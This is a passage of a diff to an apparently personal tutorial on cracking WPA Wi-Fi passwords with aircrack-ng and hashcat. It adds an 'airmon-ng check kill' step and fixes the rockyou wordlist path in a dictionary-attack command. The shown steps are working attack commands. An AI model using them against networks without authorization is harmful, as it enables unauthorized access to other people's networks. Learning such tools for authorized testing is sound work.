@@ -4,9 +4,13 @@
 2) To start monitor mode
 "airmon-ng start (interface name)"
 ex:"airmon-ng start wlan0"
+not an actual step but it shows you that some proccesses have to be kill 
+so this may be skipped
 
 3) kill all unnessesary services
 Ex: "kill 2729 2854 3436 3564"
+better method
+Ex: airmon-ng check kill
 
 4) to view wireless traffic
 "airodump-ng (interface)"
@@ -41,4 +45,4 @@ Ex: "aircrack-ng test.cap -J test"
 It will automatically add the .hccap to your file
 
 13)Use hashcat to brutefore or dictionary attack the file
-Ex for dictionary: "hashcat -m 2500 -a 0 -o cracked.txt test.hccap /usr/share/wordlists/rouckyou.txt 
+Ex for dictionary: "hashcat -m 2500 -a 0 -o cracked.txt test.hccap /usr/share/wordlists/rockyou.txt 
